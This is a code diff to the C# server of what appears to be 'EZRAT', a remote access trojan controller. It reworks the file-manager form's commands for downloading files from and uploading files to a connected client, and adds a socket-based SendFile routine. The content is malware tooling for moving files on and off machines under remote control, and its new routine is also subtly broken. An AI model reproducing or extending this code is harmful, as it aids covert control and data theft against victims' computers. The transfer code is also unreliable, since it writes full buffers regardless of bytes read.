@@ -11,6 +11,8 @@ using EZRATServer.Network;
 using EZRATServer.Forms;
 using EZRATServer.Utils;
 using System.IO;
+using System.Net.Sockets;
+using System.Threading;
 
 namespace EZRATServer
 {
@@ -78,8 +80,8 @@ namespace EZRATServer
             {
                 this.PathDownload = Path + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
                 this.BaseWindows.SendCommand("dlfile;" + this.PathDownload, this.Id);
-                this._parent.fileNameDownload = this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
-                this._parent.OnOffDlFile = true;
+                this.BaseWindows.fileNameDownload = this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
+                this.BaseWindows.OnOffDlFile = true;
             }
         }
 
@@ -94,10 +96,13 @@ namespace EZRATServer
                 try
                 {
                     //this._parent.SendFile(path,this.Path); //Send the data to the server
-                    string dataFile = string.Empty;
-                    File.ReadAllBytes(path).ToList().ForEach((b) => { dataFile += b.ToString() + Constantes.Separator; });
+                    string fileName = System.IO.Path.GetFileName(path);
+
+                    //File.ReadAllBytes(path).ToList().ForEach((b) => { dataFile += b.ToString() + Constantes.Separator; });
                     //string result = _parent.Encrypt("upfile;" + dataFile);                    //string result = _parent.Encrypt("upfile;" + dataFile);
-                    this._parent.SendCommand("upfile;" + this.Path + new NameUpload(opf.FileName).Dialog()  + ";" + dataFile, _parent.GetIdClient());
+                    this.BaseWindows.SendCommand("upfile;" + $"{this.Path}{fileName}" ,this.BaseWindows.GetIdClient()); // + this.Path + new NameUpload(opf.FileName).Dialog()  + ";" + dataFile, this.BaseWindows.GetIdClient());
+                    SendFile(path);
+
                 }
                 catch (Exception ex) //Failed to send data to the server
                 {
@@ -105,6 +110,25 @@ namespace EZRATServer
                     return; //Return
                 }
             }
+        }
+
+
+        private void SendFile(string path)
+        {
+            string file_name = System.IO.Path.GetFileName(path);
+            int size = 1024;
+            uint tot = 0;
+            FileStream fs = new FileStream(path, FileMode.Open);
+            NetworkStream ns = new NetworkStream(this.BaseWindows.ClientSockets[this.BaseWindows.GetIdClient()]);
+            byte[] data = new byte[size];
+            while (tot < fs.Length)
+            {
+                fs.Read(data, 0, size);
+                tot += (uint)data.Length;
+                ns.Write(data, 0, size);
+            }
+            Console.WriteLine($"Total data : {tot}");
+            fs.Close();
         }
 
         private void RenameFile(object sender, EventArgs e)
